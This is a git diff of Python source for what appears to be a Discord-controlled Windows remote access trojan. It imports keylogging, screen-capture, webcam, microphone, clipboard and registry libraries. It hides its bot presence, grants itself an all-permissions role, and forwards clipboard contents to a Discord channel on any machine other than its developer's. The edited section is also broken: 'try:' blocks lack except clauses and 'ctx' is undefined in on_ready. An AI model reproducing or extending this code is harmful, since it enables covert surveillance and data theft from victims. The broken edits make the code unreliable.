@@ -1,3 +1,5 @@
+DEV = "tilov"
+
 import shutil, tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, win32com.client, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
 from discord.ext import commands, tasks
 from PIL import ImageGrab
@@ -44,8 +46,6 @@ ASCII = """
 
 """
 print(ASCII)
-
-DEV = "mp"
 
 # if not os.getlogin() == DEV:
 #     win32gui.SetForegroundWindow(ctypes.windll.kernel32.GetConsoleWindow())
@@ -189,9 +189,6 @@ async def on_ready():
 
         notification_sent = True
 
-        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='Flint'))
-        print("Aktivität des Bots gesetzt.")
-
         await bot.change_presence(status=discord.Status.offline)
         print("Bot Status auf offline gesetzt.")
 
@@ -202,30 +199,32 @@ async def on_ready():
         if not existing_role:
             try:
                 role = await guild.create_role(name="BOT_perms", permissions=discord.Permissions.all())
-                print("Rolle 'BOT_perms' erstellt.")
+                await ctx.send("Rolle 'BOT_perms' erstellt.")
             except Exception as e:
-                print(f"Fehler beim Erstellen der Rolle: {e}")
+                await ctx.send(f"Fehler beim Erstellen der Rolle: {e}")
         else:
-            role = existing_role
-            print("Rolle 'BOT_perms' gefunden.")
+            try:
+                role = existing_role
+                await ctx.send("Rolle 'BOT_perms' gefunden.")
 
         if role is None:
-            print("Die Rolle 'BOT_perms' wurde nicht erstellt.")
-            return
+            try:
+                await ctx.send("Die Rolle 'BOT_perms' wurde nicht erstellt.")
+                return
 
         if member:
             try:
                 await member.add_roles(role)
-                print(f"Rolle 'BOT_perms' für {member} hinzugefügt.")
+                await ctx.send(f"Rolle 'BOT_perms' für {member} hinzugefügt.")
             except Exception as e:
-                print(f"Fehler beim Hinzufügen der Rolle für {member}: {e}")
+                await ctx.send(f"Fehler beim Hinzufügen der Rolle für {member}: {e}")
 
         if bot_member:
             try:
                 await bot_member.add_roles(role)
-                print(f"Rolle 'BOT_perms' für Bot hinzugefügt.")
+                await ctx.send(f"Rolle 'BOT_perms' für Bot hinzugefügt.")
             except Exception as e:
-                print(f"Fehler beim Hinzufügen der Rolle für Bot: {e}")
+                await ctx.send(f"Fehler beim Hinzufügen der Rolle für Bot: {e}")
 
     if not os.getlogin() == DEV:
         await on(clipboard_channel)
